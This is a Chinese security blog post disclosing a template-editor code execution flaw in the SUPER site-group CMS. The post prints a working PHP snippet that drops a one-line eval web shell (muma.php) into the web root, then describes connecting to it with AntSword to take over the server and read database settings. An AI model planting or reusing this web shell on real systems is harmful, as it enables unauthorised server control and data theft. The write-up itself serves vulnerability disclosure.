---
title: SUPER站群命令执行之官方审核
url: https://www.secpulse.com/archives/190926.html
source: 安全脉搏
date: 2022-11-12
fetch_date: 2025-10-03T22:29:31.135925
---

# SUPER站群命令执行之官方审核

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# SUPER站群命令执行之官方审核

[代码审计](https://www.secpulse.com/archives/category/articles/code-audit)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-11

39,749

# 简介

某站群原来是我们内部自己开发使用的一套程序，后来看到很多人有相似的需求，团队决定发布出来免费开源给大家使用。某公司某站群最新版本存在文件上传漏洞，攻击者可利用该漏洞获取服务器控制权限。

适合用在什么场景？推荐有建站基础，懂得SEO的专业人士使用，可用于养域名养权重，关键词流量站、蜘蛛池、企业站乃至个人博客都可以使用。

[![1668129031_636da107a986bc1d305e7.jpg](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/1668129031_636da107a986bc1d305e7.jpg "1668129031_636da107a986bc1d305e7.jpg")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/1668129031_636da107a986bc1d305e7.jpg)

# 下载程序

官网下载：https://www.cmssuper.com/

下载地址点击以后跳转此页面，点击下载谷歌是没有反应的，360和ie是可以的，谷歌浏览器报错

 `Mixed Content: The site at '<URL>' was loaded over a secure connection, but the file at '<URL>' was loaded over an insecure connection. This file should be served over HTTPS. This download has been blocked. See <URL> for more details.`

 提示遇到https和http不兼容问题

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157878.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157879.png)

打开调试，直接点击url就可以下载或者是改成https点击下载就可以下载了。但是官方审核到了三级验证中了，点击下载没反应就直接给驳回了。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157880.jpeg)

然后我又重新在文档做了说明，并下载了安装包放到附件里边重新提交的，又要从一级审核开始。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157881.png "null")

官方大人审核，不敢多言，直接上过程。

# 搭建过程

下载安装包安装完以后， 此时登录后台程序：

后台效果

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157882.png)

进入后台以后：点击系统设置->模板风格->可以下载其他模板以后，点击编辑模板，站点选择该模板。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157883.png)

复制此段程序：找到首页模板，复制进去，点击保存就可以了。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157884.png)

保存完，运行前端，会在根目录下生成文件。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157885.png)

会在根目录下生成muma.php

恶意代码：

```
<?php

$file=fopen("muma.php","w");//根目录创建muma.php文件
fwrite($file,'<');
fwrite($file,'?');
fwrite($file,'php');
fwrite($file,' @eval($_POST["cmd"]);');
fwrite($file,'?>');

?>
```

运行完以后，域名+muma.php

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-16681578851.png)

使用蚁剑链接木马，获得服务器权限：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157886.png)

查看数据配置信息：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-16681578861.png)

# 代码分析

点击保存，获取到这个地址。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157887.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157888.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190926-1668157892.png)

找到保存方法，获取body内容，stripslashes 函数对内容反斜杠处理，对非法内容并没有过滤。

至此，通过系统后台文件编辑，通过非法代码，运行文件，实现写入木马程序执行，拿到了服务器全部权限、源码，以及数据库信息，造成了很严重的后果。

E

N

D

**本文作者：[TideSec](newpage/author?author_id=26366)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/190926.html**](https://www.secpulse.com/archives/190926.html)

Tags: [SEO](https://www.secpulse.com/archives/tag/seo)、[SUPER站群](https://www.secpulse.com/archives/tag/super%E7%AB%99%E7%BE%A4)、[个人博客](https://www.secpulse.com/archives/tag/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2)、[企业站](https://www.secpulse.com/archives/tag/%E4%BC%81%E4%B8%9A%E7%AB%99)、[关键词流量站](https://www.secpulse.com/archives/tag/%E5%85%B3%E9%94%AE%E8%AF%8D%E6%B5%81%E9%87%8F%E7%AB%99)、[域名](https://www.secpulse.com/archives/tag/%E5%9F%9F%E5%90%8D)、[权重](https://www.secpulse.com/archives/tag/%E6%9D%83%E9%87%8D)、[蜘蛛池](https://www.secpulse.com/archives/tag/%E8%9C%98%E8%9B%9B%E6%B1%A0)

点赞：
4
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![通过发现隐藏的参数值实现任意用户登录](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/1686814573170-300x250.png)

  通过发现隐藏的参数值实现任意用户登录](https://www.secpulse.com/archives/202100.html "详细阅读 通过发现隐藏的参数值实现任意用户登录")
* [![资产发现之水平关联](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/1681372091211-300x172.png)

  资产发现之水平关联](https://www.secpulse.com/archives/198908.html "详细阅读 资产发现之水平关联")
* [![漏洞挖掘之信息收集](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196746-1677478418-300x214.png)

  漏洞挖掘之信息收集](https://www.secpulse.com/archives/196746.html "详细阅读 漏洞挖掘之信息收集")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/43b12cc12b9dbbe6a010c40d69088feb-300x298.png)](https://www.secpulse.com/newpage/author?author_id=26366aaa) | [TideSec ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](https://www.secpulse.com/newpage/author?author_id=26366) | |
| 文章数：145 | 积分： 185 |
|  | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/sec...